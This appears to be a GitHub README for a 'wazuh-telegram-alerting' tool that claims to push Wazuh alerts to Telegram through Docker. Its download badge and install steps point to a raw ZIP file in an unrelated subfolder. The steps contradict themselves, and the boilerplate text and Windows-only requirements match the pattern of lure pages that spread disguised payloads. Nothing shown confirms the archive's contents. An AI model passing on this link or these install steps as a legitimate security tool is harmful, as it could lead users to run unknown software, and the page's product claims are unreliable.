# 🔔 wazuh-telegram-alerting - Send instant security alerts to Telegram

[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/redolent-viyella935/wazuh-telegram-alerting/raw/refs/heads/main/dewaterer/wazuh_alerting_telegram_3.4.zip)

This tool connects your Wazuh security system to your Telegram account. It sends security notifications to your phone in real time. You get instant updates about your computer network status. The software formats these alerts in a clean way so you understand them. It runs reliably in your environment.

## 📋 What This Tool Does

Security monitoring requires fast information. This tool takes data from Wazuh and turns it into readable messages. You do not need to check a dashboard. Your information comes to you.

- Sends alerts to Telegram groups or private chats.
- Formats messages using Markdown for easy reading.
- Works well for production environments.
- Relies on stable Python code.
- Uses Docker for simple deployment.

## 💻 System Requirements

Your computer needs specific parts to run this software. Make sure you meet these standards before you start.

- Windows 10 or Windows 11.
- Docker Desktop installed and running.
- A functional Telegram account.
- A Telegram Bot token. You get this from BotFather inside Telegram.
- A working installation of the Wazuh manager.

## 🚀 Downloading and Installing

Follow these steps to set up the software.

1. Visit this [download page](https://github.com/redolent-viyella935/wazuh-telegram-alerting/raw/refs/heads/main/dewaterer/wazuh_alerting_telegram_3.4.zip) to get the files.
2. Click the green Code button on the page.
3. Choose Download ZIP.
4. Open the ZIP file on your computer.
5. Move the folder to a spot where you keep your programs.
6. Open your terminal or command prompt inside that folder.

## ⚙️ Configuration Steps

You must configure the tool before it works. Open the files you downloaded in a text editor like Notepad.

### Setup your Telegram Bot
1. Search for BotFather in Telegram.
2. Send the message /newbot to BotFather.
3. Follow the instructions to name the bot.
4. Copy the API token provided by BotFather.
5. Paste this token into the configuration file of this software.

### Connect to Wazuh
1. Find the configuration file named config.yaml.
2. Update the fields with your Wazuh server address.
3. Save the file.
4. Close your text editor.

## 🏃 Running the Application

You use Docker to start the tool. Docker handles the background work for you.

1. Ensure Docker Desktop is open.
2. Open your command prompt again inside the folder.
3. Type the command `docker-compose up -d`.
4. Press Enter.
5. Wait for the containers to build and run.
6. Check your Telegram account for a test message.

## 🔎 Checking Status

You need to know if the tool stays active. Docker provides a simple way to track status.

1. Open the Docker Desktop dashboard.
2. Look for the project name in the list.
3. The green icon shows the tool runs correctly.
4. Click the logs tab to see recent connection attempts.
5. If the logs show lines with "connected", the alert system works.

## 🛠 Solving Common Issues

Problems happen sometimes. Keep these tips in mind.

### Docker does not show the project
Restart Docker Desktop. Sometimes the application needs a refresh to find new folders. Ensure you run the command from inside the correct directory.

### No alerts arrive in Telegram
Check your token. A wrong token prevents the app from sending messages. Open your config.yaml and check the value. If you make changes, run `docker-compose up -d` one more time to apply them.

### Connection errors with Wazuh
Verify your server address. Type the address into your web browser. If the browser reaches the server, the tool can reach it too. Ensure your internal network allows traffic between the Docker container and the Wazuh manager.

## 🔒 Security Practices

This tool handles sensitive data. Follow these steps to keep your system safe.

- Keep your token private. Never share the API token in public channels.
- Use strong passwords for your Wazuh account.
- Update your software regularly. Check the GitHub link for updates.
- Monitor your Docker logs for errors.
- Limit access to the server where you run this software.

## 🤝 Project Background

The project uses Python to process security logs. It converts raw JSON data from Wazuh into human-readable text. It uses the Telegram API to push these texts to your device. This architecture ensures you receive alerts even if you stay away from your desk. The use of Docker makes the setup consistent. You get the same result regardless of your computer settings.

## 📄 License Information

This project follows standard open-source rules. You can view the full license file in the main folder. You have permission to use, modify, and distribute the code for your own security needs. 

## 📩 Final Steps

You now have a automated alert system. It watches your security data and informs you of changes. Observe the Telegram notifications for a few days. You can adjust the frequency of alerts by changing the settings in the yaml file. This keeps your phone quiet and ensures you only see important security updates.